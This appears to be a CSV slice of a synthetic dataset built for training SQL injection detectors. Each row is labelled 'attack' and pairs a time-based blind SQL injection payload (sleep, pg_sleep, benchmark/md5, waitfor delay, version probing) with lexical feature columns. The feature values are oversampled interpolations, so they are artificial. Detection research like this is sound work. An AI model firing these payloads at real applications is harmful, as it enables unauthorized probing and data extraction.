id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000663,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.1651105756247093,50.30969651810699,20.13764289693644,3.3229023207115422,13.240875069638768,11.137642896936441,19.96558927576589,5.96558927576589,0.2627178639818806,0.22117812988055766,0.3973171299749677,0.11878687616259409,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9655892757658902,0.0,0.0,1.0,0.0,0.0,0.034410724234110096,3.469446951953614e-18,0.03441072423411007,0.0,0.0,0.0,0.0,0.96558927576589,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000664,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,1.0219285880073665,88.52943127800329,21.135553265739702,3.0099602612632674,31.406659797219106,1.7161116835650745,44.271106531479404,11.135553265739702,0.35267387079998547,0.020169836875299593,0.5019738236823662,0.12518246864234875,0.8516649493047768,0.0,0.0,0.0,1.0,0.0,0.0,9.283888316434926,0.0,0.0,0.0,1.0,0.2838883164349256,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000665,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.573824097795702,100.1420525009786,28.230287857182798,4.091054964415883,51.76345428619359,4.0,28.9180225004194,15.4605757143656,0.5187498028208095,0.04266888235247125,0.27923034033777916,0.15935097448894,4.0,0.0,2.0,0.0,0.0,0.0,0.0,4.460575714365599,0.0,0.3848560714086001,1.0,3.6151439285914,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.6151439285913999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6151439285914
SMOTE_000666,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.3291573784682804,77.1640453780526,23.50786386584218,3.3388524494723506,15.835954621947392,18.0,34.32809075610521,9.0,0.20528419856010316,0.2332808126245361,0.4447945825030927,0.11664040631226805,0.0,0.0,0.0,0.0,0.0,2.0,0.0,5.082022689026304,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.9179773109736966,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.9179773109736966,0.0,1.0820226890263034,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000667,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,3.1789827953780248,128.26696247183372,29.689283295778303,3.571102276997412,47.53392494366746,10.0,54.3107167042217,16.422320823944577,0.3703691796858418,0.07797276652220853,0.4236530056337654,0.12800504815818423,2.422320823944576,0.0,0.0,0.0,1.0,1.0,0.0,9.577679176055424,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.42232082394457593,0.0,1.0,1.0,0.0,0.0,0.0,0.42232082394457604,3.0,0.0,1.0,1.4223208239445762,0.42232082394457604,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.844641647889151
SMOTE_000668,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000104,0.5196735959267254,121.4076646041443,24.0,3.0202149350136103,39.13643870504504,1.8635612949549634,62.953419424324444,17.454245179819853,0.3235806052122855,0.015227824221668712,0.5176440713784064,0.14354749918763937,3.863561294954963,0.0,0.0,0.0,1.0,0.8635612949549633,0.0,11.727122589909925,0.0,0.0,0.0,1.8635612949549634,1.0,0.0,0.0,0.0,0.0,0.8635612949549633,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.863561294954963,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.863561294954963
SMOTE_000669,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,1.2413764462006371,35.02607004893849,16.0,3.1121724112967106,10.999999999999998,0.0,15.026070048938493,9.0,0.3145574161062612,-1.3877787807814457e-17,0.4280774252613433,0.2573651586323955,0.34202334964616443,1.3159533007076716,0.0,0.0,0.0,1.0,0.0,2.342023349646164,0.0,4.0,0.0,1.0,0.3420233496461643,0.6579766503538356,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000670,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,0.8160286099092883,82.33882998499968,24.70964533733342,3.400435304930218,16.822588665666647,19.35482266866671,35.51624131933304,10.64517733133329,0.2050688952666673,0.23709616086078594,0.4285722643215664,0.12926267955098036,0.0,1.0,0.0,0.0,0.0,1.0,0.0,6.467765996999937,0.17741133433335454,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.1774113343333546,0.8225886656666455,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000671,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.6906220696632475,90.16895310429913,27.433790620859828,3.8499583306856664,21.72298436809971,29.144596873619943,30.867581241719652,8.433790620859826,0.24063047321298464,0.32400980636075466,0.3421534152849024,0.0932063051413583,0.1445968736199421,0.0,0.2891937472398846,0.0,0.0,2.0,0.0,4.144596873619943,0.0,0.0,1.0,2.2891937472398842,0.14459687361994233,0.0,0.1445968736199423,0.8554031263800577,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000672,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,1.5328206518042518,81.70581054266374,20.568603514221248,3.0670754183427063,29.27441405688499,2.0,39.56860351422125,10.862792971557505,0.35796630118959005,0.024486201643775976,0.4843315768032852,0.13321592036334873,0.4313964857787529,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.43139648577875284,0.0,0.0,1.0,0.43139648577875295,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000673,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R000108,2.235372165895276,105.69445996687105,28.118619457668704,3.4540408639762634,24.677929186503057,18.355858373006114,47.86412376319011,14.796548644171763,0.23844275811135252,0.17404349683726655,0.44736204638675725,0.14015169866462365,0.0,3.5593097288343527,0.0,0.0,0.0,1.5593097288343523,0.0,8.237238915337409,0.4406902711656475,0.0,1.0,1.5593097288343525,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.4406902711656475,0.0,0.0,0.0,1.0,0.5593097288343525,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000674,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,1.0642448018149644,66.06058597004963,22.764570309996184,3.3916708514251055,19.0,10.0,29.35429690003817,7.706289070011451,0.2894421191664697,0.1523379574560367,0.44229007592127506,0.11592984745621848,0.0,0.7645703099961829,0.47085938000763417,0.0,0.0,1.0,0.0,4.470859380007634,0.0,1.0,0.0,1.4708593800076342,0.0,0.7645703099961829,0.23542969000381708,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000675,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,0.8413700873779112,124.72320696551705,28.25297700383144,3.4672157580397784,44.24106898850569,10.0,54.48213797701137,16.0,0.3547358499994631,0.08025943749798675,0.43658961250577133,0.1284150999967788,2.2529770038314387,0.0,0.0,0.0,1.0,1.0,0.0,9.74702299616856,0.0,0.0,0.0,3.7470229961685617,1.0,0.0,0.0,0.2529770038314384,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,3.0,0.0,1.0,1.0,0.0,0.2529770038314385,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.252977003831438
SMOTE_000676,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,1.4168610574392733,86.0045740157401,19.199390131234654,2.87998424071081,27.0,2.0,44.60426908135743,12.400304934382673,0.3161679607335549,0.023419848943226282,0.5156793605124644,0.1447328298107543,0.5996950656173267,0.0,0.0,0.0,1.0,0.0,0.0,9.20091480314802,0.5996950656173268,0.0,0.0,1.0,0.5996950656173268,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000677,attack,time,1%'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000113,1.9870019296571497,33.55326962875712,14.0,2.762820225470607,8.468038222745731,2.0,17.06392355450854,6.021307851502847,0.2571473912343606,0.05994037700939585,0.5046916266910082,0.17822060506523538,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5106539257514235,0.5106539257514234,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.5106539257514233,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5106539257514235
SMOTE_000678,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,1.0177612319436273,30.540407833643087,13.540407833643087,2.899920569078267,10.000000000000002,2.0,14.000000000000002,4.540407833643087,0.3275224964124399,0.06550449928248799,0.4585314949774159,0.1484415093276562,0.5404078336430874,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.5404078336430873,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000679,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.30737317384168245,34.47067958274811,15.533619970196295,3.093906388368971,10.999999999999998,0.5336199701962947,14.869819672159233,8.067239940392588,0.33317301227621565,0.013015121224299847,0.4157624344205657,0.23804943207891877,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0672399403925876,0.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000680,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,0.411719434015532,30.084609477474807,13.507656864848835,2.922462819299875,10.676875819798447,1.9153905225251942,13.492343135151167,4.0,0.3542582578701132,0.0637553728180712,0.44901694770955664,0.13296942160225889,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.915390522525194,0.0,0.08460947747480574,0.0,0.0,0.0,0.0,0.0,0.9153905225251944,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000681,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,1.6473253845171967,81.37733084291702,21.868007471248955,3.0646007017786876,28.0,2.0,40.13199252875104,11.24533831416597,0.3440883373077874,0.02457773837912766,0.49307068532897785,0.13826323898410708,0.0,0.622669157082985,0.0,0.0,1.0,0.0,0.0,8.377330842917015,0.622669157082985,0.0,0.0,1.0,0.0,0.622669157082985,0.0,0.6226691570829849,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000682,attack,time,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jrpk'  =  'jrpk,nearest_attack_euclidean,R000092,0.6256129932511908,131.0593683266294,24.78437425851438,2.9221384181963135,38.215625741485624,2.0,71.27499406811503,19.568748517028755,0.29192470453587616,0.01527293617188584,0.5435508321134703,0.14925152717876766,4.0,0.0,0.0,0.0,1.0,1.0,0.0,13.568748517028759,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.2156257414856215,0.7843742585143783,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000683,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,1.3259067121314865,88.80485742360547,27.398380858798177,3.480886590875386,20.21133398841277,17.39028515278906,38.60161914120182,12.601619141201823,0.22701255915890461,0.19643075381825453,0.4347070604326374,0.14184962659020345,2.203238282403648,0.0,0.0,0.0,0.0,1.0,0.0,7.0,0.9999999999999999,0.0,1.0,1.0,1.0,0.0,0.0,0.39838085879817614,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.6016191412018238,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.601619141201824
SMOTE_000684,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.45780794159668736,39.68218776103729,16.0,3.1562460746855385,13.0,0.0,16.068489800864405,10.613697960172882,0.3294520893561609,-1.3877787807814457e-17,0.40251137032912293,0.2680365403147162,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.613697960172882,0.0,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000685,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.6879634665368779,58.29478340126296,19.18496905732328,3.2867980555145775,25.63006188535344,1.0,24.10981434393968,7.554907171969839,0.44113189666455843,0.017188929988688886,0.41268623886390177,0.1289929344828509,3.0,0.0,0.0,0.0,0.0,0.18496905732327962,0.0,4.18496905732328,0.0,0.18496905732327973,0.0,0.18496905732327984,1.0,0.0,0.0,0.0,0.0,0.18496905732327973,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8150309426767203,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8150309426767204
SMOTE_000686,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.6777076401556728,58.83649898170301,18.602807613977156,2.94735091868487,10.000000000000002,10.0,30.028076139771546,8.808422841931463,0.1720695496884099,0.17206954968840987,0.5071556089361141,0.14870529168706606,0.6028076139771545,0.39719238602284546,0.0,0.0,0.0,1.0,0.0,5.2056152279543095,0.0,0.0,1.0,1.0,0.6028076139771544,0.3971923860228454,0.0,0.6028076139771545,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000687,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,0.6172493464944451,69.60590301306004,20.622878112562226,3.200708975091227,24.872029357587117,2.121180602612008,31.989814940298686,10.622878112562226,0.3637139057586202,0.025107462092045355,0.45725013887620053,0.1539284932731339,3.1245756225124452,0.0,0.0,0.0,0.0,1.1245756225124452,0.0,5.373726867537336,0.0,1.0,0.0,1.1245756225124452,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.12457562251244525,1.1245756225124452,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2491512450248905
SMOTE_000688,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.031389370654074315,100.0,33.83799820269465,4.087622722789706,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0000000000000002,6.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0000000000000002,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000689,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000085,0.5531437672451648,93.22023680792009,22.74007893597336,3.1825465178238397,30.653438581297817,2.0,44.82671929064891,15.740078935973361,0.32873540495575365,0.021471780523674572,0.4810764652020768,0.16871634931849494,3.7400789359733624,0.0,0.0,0.0,1.0,0.9133596453244541,0.0,8.086640354675545,1.9133596453244541,0.0,0.0,1.9133596453244541,1.0,0.0,0.0,0.08664035467554587,0.0,0.9133596453244541,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,0.0,0.0,1.0,1.8267192906489083,0.08664035467554587,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.913359645324454
SMOTE_000690,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000051,0.12097389519416196,108.97663978160432,29.97663978160432,3.790972073422198,26.04672043679136,28.953279563208635,42.0,11.97663978160432,0.23901630082301617,0.2656799964936474,0.38540444522363393,0.1098992574597026,0.9766397816043187,0.023360218395681143,1.9532795632086377,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,3.9532795632086373,0.9766397816043187,0.023360218395681254,0.9766397816043189,0.023360218395681254,0.0,1.0,1.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000691,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre",nearest_attack_euclidean,R000102,0.022235082243632912,105.96142633175998,23.025715778826676,2.8885415829186933,21.01714385255112,10.034287705102233,57.91856670038219,16.991428073724443,0.1983687313172008,0.0947306198622094,0.5465478839718375,0.16035276484875227,4.0,0.0,0.0,0.0,0.0,2.0,0.0,9.982856147448883,0.0,0.0,1.0,2.0085719262755584,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.004285963137779514,0.0,0.0042859631377792085,0.0,0.9957140368622206,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.004285963137779
SMOTE_000692,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.1703304671990221,44.1587251437643,17.0,3.1041605477647947,13.0,0.0,19.29893761980359,11.859787523960717,0.2962535846000431,-1.3877787807814457e-17,0.4345304309871214,0.26921598441283545,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.859787523960718,0.0,5.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
